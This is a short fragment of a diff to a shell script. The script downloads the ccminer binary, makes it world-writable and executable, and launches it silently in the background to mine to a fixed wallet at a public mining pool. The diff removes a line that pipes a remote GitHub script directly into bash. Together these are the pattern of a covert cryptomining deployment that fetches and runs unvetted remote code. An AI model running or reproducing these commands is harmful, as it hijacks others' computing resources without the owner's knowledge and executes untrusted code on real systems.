@@ -15,4 +15,3 @@ wget https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_C
 tar -xf ccminer_CPU_3.8.3.tar.xz
 chmod 777 ccminer
 ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3960 -u RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP.cucu."AP$RANDOM" >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
